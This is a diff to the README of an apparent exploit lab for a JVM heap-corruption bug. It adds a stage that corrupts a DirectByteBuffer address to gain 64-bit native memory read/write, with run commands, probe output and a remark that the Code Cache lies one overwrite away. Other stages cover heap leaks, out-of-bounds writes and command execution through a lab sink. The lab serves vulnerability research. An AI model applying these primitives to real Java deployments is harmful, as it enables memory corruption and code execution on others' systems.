@@ -40,12 +40,13 @@ Tested end-to-end on **2026-11-22** with:
 All base stages behaved as expected: `trigger`, `corrupt`, `leak`, and `write`
 reproduced; `control` did not reproduce (which is the expected result).
 
-The `chain` stage — the real second half — reached every heap primitive and
-completed three forced GCs after header repair. It **stops at the Code Cache**:
-the primitive is heap-relative and cannot dereference a native `Method*`. The
-`rce` stage reaches command execution through a purpose-built application sink;
-it is not Code Cache RCE. Both negative controls (`chain-control`,
-`rce-control`) failed to reproduce, as intended.
+The `chain` stage reached every heap primitive and completed three forced GCs
+after header repair. The `native` stage then obtained a **64-bit native
+read/write** by corrupting a `DirectByteBuffer.address` — no Unsafe, no JNI, no
+second bug. Overwriting a Code Cache `nmethod` from there is the remaining step
+and is not implemented. The `rce` stage reaches command execution through a
+purpose-built application sink, which is a separate path. Negative controls
+(`chain-control`, `rce-control`) failed to reproduce, as intended.
 
 On a real AVX-512 host, use `LAB_MODE=native` to skip SDE.
 
@@ -63,9 +64,10 @@ shows how that fixed write becomes a useful primitive:
 5. The same corruption gives a heap-disclosure primitive ("JavaBleed").
 6. The `chain` stage builds the real second half: writer, reader, forged array
    header, and header repair that survives a forced GC.
-7. The `rce` stage moves attacker bytes into an application sink and executes
-   them. It is explicitly not Code Cache RCE; see
-   [What stops the chain at the Code Cache](#what-stops-the-chain-at-the-code-cache).
+7. The `native` stage corrupts a `DirectByteBuffer` address to obtain a 64-bit
+   native read/write — the primitive needed to reach the Code Cache.
+8. The `rce` stage moves attacker bytes into an application sink and executes
+   them. It is a different, application-specific path.
 
 ## Affected versions
 
@@ -113,7 +115,7 @@ git clone https://github.com/akshutgoyal/Java4Shell.git
 cd Java4Shell
 chmod +x run.sh
 
-./run.sh --build all     # build the image and run the five base stages + chain
+./run.sh --build all     # build the image and run every stage
 ```
 
 Run individual stages:
@@ -126,6 +128,7 @@ Run individual stages:
 ./run.sh write         # chosen-value OOB write into a neighbour
 ./run.sh chain         # writer -> reader -> forged header -> repair + GC
 ./run.sh chain-control # same chain with the intrinsic disabled
+./run.sh native        # 64-bit native read/write via corrupted buffer
 ./run.sh rce           # command execution via a local application sink
 ./run.sh rce-control   # same RCE attempt with the intrinsic disabled
 ```
@@ -163,6 +166,9 @@ docker compose run --rm java4shell trigger
 
 `auto` uses the native JVM when `/proc/cpuinfo` has all four AVX-512 flags, and
 SDE otherwise. Force it with `LAB_MODE=native` or `LAB_MODE=sde`.
+
+Note: the `native` *stage* (`./run.sh native`, the 64-bit native read/write
+demo) is unrelated to `LAB_MODE=native` (run the JVM without SDE).
 
 On real AVX-512 hardware:
 
@@ -272,7 +278,8 @@ post content intact  = true
 reader[64] rejected  = true
 REPAIR OK: JVM survived GC with the corrupted writer abandoned
 
-CHAIN COMPLETE (heap writer/reader/forge/repair); CODE CACHE BLOCKED
+CHAIN COMPLETE (heap writer/reader/forge/repair)
+NATIVE ACCESS IS REACHABLE: see the 'native' stage
 ```
 
 What each phase establishes:
@@ -286,7 +293,8 @@ What each phase establishes:
 
 Repair is the step the researchers describe as necessary "to keep the JVM
 running": without it the next young collection dies walking a half-smashed
-object.
+object. The phase table above shows why `chain` is only the heap half — the
+`native` stage below is what leaves the Java heap.
 
 ### `chain-control` — negative control
 
@@ -300,19 +308,59 @@ NOT VULNERABLE: length unchanged
 Exit 1 from the program, which the runner normalizes to 0 after confirming the
 expected "no corruption" result. No corruption means no writer, reader or forge.
 
-### What stops the chain at the Code Cache
+### `native` — 64-bit native read/write (no Unsafe, no JNI)
 
-`chain` deliberately reports its own limit rather than claiming RCE. The
-primitives above are all **heap-relative**: every reference is a 32-bit
-compressed oop and every array access is `base + non-negative int index`. That
-cannot reach the Code Cache, which lives in native memory outside the Java heap.
-A `Method*` read through this primitive is still just data; nothing in the chain
-can load it as an instruction pointer.
+`Chain` is heap-only by construction: every reference is a 32-bit compressed oop
+and every access is `base + non-negative int`, so it cannot leave the Java heap.
+That is a limit of *that program*, not of the vulnerability.
 
-Crossing that boundary needs a raw native read/write — `sun.misc.Unsafe`, JNI,
-or a second memory-safety bug — which this lab does not add. This is the one
-primitive the real chain has that the lab does not: Calif's arbitrary write
-"reach[es] the Code Cache and JVM hooks for code execution".
+`NativeProbe` takes the next step. It corrupts the `address` field of a
+`java.nio.DirectByteBuffer` through the same corrupted writer, then uses the
+buffer's own public API — which now dereferences an attacker-chosen 64-bit
+address:
+
+```text
+victim data    = 0x7175cfb08  at writer[848]
+direct object  = 0x7175cf978
+
+--- probing candidate address slots ---
+  +16  0x00007f7700179de0  read=0x1122334455667788   <== address field
+
+direct.getLong(0) = 0x1122334455667788
+victim[8..15]     = 55 66 77 88 99 aa bb cc
+
+native read  ok = true
+native write ok = true
+
+NATIVE PRIMITIVE REACHED FROM HEAP CORRUPTION ALONE
+DirectByteBuffer.address is a full 64-bit pointer.
+The Code Cache lives in that same address space.
+```
+
+The offsets are computed, not hardcoded: the narrow oops in an `Object[]` give
+the array and buffer addresses, the victim's fill run locates it inside the
+writer's view, and the address field is then confirmed by redirecting it at a
+known array and reading it back through `ByteBuffer.getLong`.
+
+This matters because the JVM's Code Cache is an `rwxp` mapping in that same
+address space. In this image, `/proc/self/maps` shows 45 executable mappings,
+20 of them writable+executable, including a 64 MB anonymous `rwxp` region.
+A 64-bit native read/write is therefore one rewritten function pointer away from
+code execution — no `sun.misc.Unsafe`, no JNI, and no second memory-safety bug.
+
+That last step (locate an `nmethod`/JVM hook, overwrite it, trigger it) is
+**not implemented here**. It is mechanical rather than blocked: it needs
+HotSpot-internals work against a specific build, and it is deliberately out of
+scope for this lab. So the honest status is:
+
+| Step | Status |
+|---|---|
+| Fixed OOB write → corrupted length | ✅ verified |
+| Heap disclosure ("JavaBleed") | ✅ verified |
+| Chosen-value linear write | ✅ verified |
+| Header repair + GC survival | ✅ verified |
+| **64-bit native read/write** | ✅ verified (`native` stage) |
+| **Code Cache overwrite → shellcode** | ❌ not implemented (mechanical next step) |
 
 ### `rce` — command execution via an application sink
 
@@ -445,7 +493,8 @@ Code Cache.
 | `poc/HeapCorruption.java` | A 66-byte destination places the next array's length field at store offset 36. The length becomes `0x699AA669`, and a normal Java read at index 4096 succeeds. |
 | `poc/HeapLeak.java` | A neighbouring `secret` array is disclosed through ordinary Java reads on the now-huge victim. |
 | `poc/HeapWrite.java` | The same corrupted length turns ordinary Java stores into a chosen-value OOB write into a neighbouring array. |
-| `poc/Chain.java` | Writer → reader → forged header → repair. Establishes chosen-value linear write, heap disclosure, aliased object access, and GC survival. Reports its own Code Cache limit. |
+| `poc/Chain.java` | Writer → reader → forged header → repair. Establishes chosen-value linear write, heap disclosure, aliased object access, and GC survival. Heap-only by construction. |
+| `poc/NativeProbe.java` | Corrupts a `DirectByteBuffer.address` and demonstrates 64-bit native read/write with no Unsafe/JNI. Finds the field by oracle rather than a hardcoded offset. |
 | `poc/RceLab.java` | Deliberately vulnerable HTTP target: decode sink, corrupted session blob, and a maintenance hook that executes a recovered config string. |
 | `poc/RceClient.java` | Attacker client: fires the trigger, scans the heap through the corrupted length, and asks the target to execute the recovered command. |
 
@@ -456,18 +505,18 @@ disposable container.
 
 ## Scope and limitations
 
-- **The chain stops at a heap-only primitive.** `Chain.java` reaches
-  chosen-value linear write, heap disclosure, forged-header object aliasing, and
-  repair with GC survival. It does not reach the Code Cache: all of its
-  references are heap-relative compressed oops, so it cannot dereference the
-  native `Method*`/`nmethod` pointer that code execution requires. That last
-  step needs a raw native write (Unsafe/JNI/second bug), which is deliberately
-  out of scope.
+- **The chain reaches native memory but not code execution.** `Chain.java` is
+  heap-only by construction. `NativeProbe.java` goes further: corrupting a
+  `DirectByteBuffer.address` yields a 64-bit native read/write with no Unsafe,
+  JNI, or second bug. Overwriting a Code Cache `nmethod`/JVM hook from there is
+  the remaining step; it is mechanical but HotSpot-build-specific, and is not
+  implemented in this lab.
 - **Command execution uses an application sink.** The `rce` stage reaches
   `ProcessBuilder` because `RceLab` contains a maintenance hook that runs a
   config string from the session blob. The exploit moves attacker bytes into
-  that sink; it does not create the sink or execute native code. This matches
-  why Calif and VulnCheck call RCE application-specific.
+  that sink; it does not create the sink. This is a *different* path from the
+  native primitive above, and matches why Calif and VulnCheck call RCE
+  application-specific.
 - **No universal payload.** A real chain needs a reachable decoder, a suitable
   heap layout, a live writer/reader pair or other feedback path, and
   application-specific timing. Network conditions matter. The lab target is
@@ -551,6 +600,7 @@ poc/HeapCorruption.java length corruption + OOB read
 poc/HeapLeak.java       JavaBleed-style heap disclosure
 poc/HeapWrite.java      chosen-value OOB write
 poc/Chain.java          writer -> reader -> forge -> repair (second half)
+poc/NativeProbe.java    corrupted buffer address -> native read/write
 poc/RceLab.java         vulnerable HTTP target for the RCE stage
 poc/RceClient.java      attacker client for the RCE stage
 compose.yaml            optional Compose configuration
